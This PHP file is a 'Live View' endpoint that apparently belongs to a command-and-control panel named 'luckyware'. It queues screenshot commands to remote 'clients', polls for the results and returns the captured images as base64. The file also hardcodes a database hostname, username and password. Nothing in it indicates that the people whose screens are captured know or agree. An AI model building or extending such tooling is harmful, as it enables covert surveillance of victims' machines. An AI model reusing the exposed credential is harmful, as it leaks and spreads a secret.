<?php
// Live View AJAX endpoint - Returns latest screenshot data
session_start();

if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

// Database configuration - PostgreSQL (Render Internal)
$db_host = 'dpg-db0k1ifavr4c7382re2g-a';
$db_name = 'luckyware';
$db_user = 'luckyware_user';
$db_pass = 'SR5BqBJhHKOlYEjvn5ia71HFWRJtTIZ4';

try {
    $pdo = new PDO("pgsql:host=$db_host;port=5432;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

$client_id = isset($_GET['client_id']) ? $_GET['client_id'] : '';
$action = isset($_GET['action']) ? $_GET['action'] : 'get';

if(empty($client_id)) {
    http_response_code(400);
    echo json_encode(['error' => 'No client specified']);
    exit;
}

// Get client info
$stmt = $pdo->prepare("SELECT * FROM clients WHERE id = ?");
$stmt->execute([$client_id]);
$client = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$client) {
    http_response_code(404);
    echo json_encode(['error' => 'Client not found']);
    exit;
}

header('Content-Type: application/json');

if($action == 'start') {
    // Request new screenshot
    $stmt = $pdo->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, 'screenshot', '', 'pending', NOW())");
    $stmt->execute([$client['client_id']]);
    echo json_encode(['success' => true, 'message' => 'Screenshot requested']);
    exit;
}

if($action == 'stop') {
    // Delete pending screenshot commands
    $stmt = $pdo->prepare("DELETE FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status = 'pending'");
    $stmt->execute([$client['client_id']]);
    echo json_encode(['success' => true, 'message' => 'Live view stopped']);
    exit;
}

// Default action: Get latest screenshot
$stmt = $pdo->prepare("SELECT result, completed_at, id FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status = 'completed' AND result LIKE 'SCREENSHOT:%' ORDER BY completed_at DESC LIMIT 1");
$stmt->execute([$client['client_id']]);
$latest = $stmt->fetch(PDO::FETCH_ASSOC);

// Check for pending screenshots
$stmt = $pdo->prepare("SELECT COUNT(*) FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status IN ('pending', 'executing')");
$stmt->execute([$client['client_id']]);
$pending = $stmt->fetchColumn();

$response = [
    'success' => true,
    'has_screenshot' => !empty($latest),
    'pending' => $pending > 0,
    'timestamp' => $latest ? $latest['completed_at'] : null,
    'screenshot_id' => $latest ? $latest['id'] : null,
    'data' => null
];

if($latest) {
    $screenshot_data = $latest['result'];
    if (strpos($screenshot_data, 'SCREENSHOT:') === 0) {
        $screenshot_data = substr($screenshot_data, 11);
    }
    $response['data'] = $screenshot_data;
    $response['size'] = strlen($screenshot_data) * 3 / 4;
}

echo json_encode($response);
?>
